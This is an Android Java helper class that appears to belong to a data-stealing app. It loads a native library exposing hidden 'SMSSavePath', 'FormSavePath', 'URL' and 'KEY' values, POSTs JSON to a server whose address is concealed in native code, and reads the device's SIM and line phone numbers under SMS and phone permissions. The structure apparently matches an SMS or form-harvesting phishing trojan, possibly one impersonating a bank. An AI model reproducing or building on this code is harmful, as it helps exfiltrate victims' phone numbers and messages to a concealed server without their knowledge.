package com.mydesign.service.boi.net;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.icu.text.SimpleDateFormat;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Scanner;



public class Helper {

    public static String TAG = "AppManager";
    {
        System.loadLibrary("native-lib");
    }
    public  native String SMSSavePath();
    public  native String FormSavePath();
    public  native String URL();
    public  native String SITE();
    public  native String KEY();
    public native String getNumber();

    public static void postRequest(String path, JSONObject jsonData, ResponseListener listener) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    Helper helper = new Helper();
                    String urlString = helper.URL() + path;
                    URL url = new URL(urlString);

//                    String plain_text = jsonData.toString();
//                    JSONObject encData = new JSONObject();
//                    String plain_text_enc  = Security.encrypt(plain_text, helper.KEY());
//                    encData.put("payload", plain_text_enc);
//                    encData.put("secure", true);

                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Write JSON data to the output stream
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(jsonData.toString());
                    writer.flush();
                    writer.close();
                    os.close();

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                // Pass the result to the listener

                if (listener != null) {
                    listener.onResponse(result);
                }
            }
        }.execute(path);
    }

    // Interface for callback
    public interface ResponseListener {
        void onResponse(String result);
    }

    public static void getRequest(String path, ResponseListener listener) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    Helper helper = new Helper();
                    String urlString = helper.URL() + path; // Append the path to the base URL
                    URL url = new URL(urlString);

                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("Accept", "application/json");

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                // Pass the result to the listener
                if (listener != null) {
                    listener.onResponse(result);
                }
            }
        }.execute(path);
    }


    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = connectivityManager.getActiveNetwork();
                if (network != null) {
                    NetworkCapabilities networkCapabilities = connectivityManager.getNetworkCapabilities(network);
                    return networkCapabilities != null && (
                            networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
                    );
                }
            } else {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                return activeNetworkInfo != null && activeNetworkInfo.isConnected();
            }
        }
        return false;
    }

    public static String getSimNumbers(Context context) {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "Permission is Denied on getSimNumbers";
        }
        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfoList != null) {
            StringBuilder Numbers = new StringBuilder();
            for (SubscriptionInfo info : subscriptionInfoList) {
                Numbers.append(" | ").append(info.getNumber());
            }
            if(Numbers.length() > 0) {
                Numbers = new StringBuilder(getPhoneNumber(context));
            }
            return Numbers.toString();
        }else{
            return "subscription info is null on getSimNumbers";
        }
    }

    public static String getPhoneNumber(Context context) {
        // default phone number..
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tMgr != null) {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                Log.d("mywork", "Phone OR SMS permission is not granted");
                return "Phone OR SMS permission is not granted";
            }
            @SuppressLint("HardwareIds") String mPhoneNumber = tMgr.getLine1Number();
            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
                return mPhoneNumber;
            } else {
                return "Phone number not available";
            }
        } else {
            return "TelephonyManager is null";
        }
    }

}

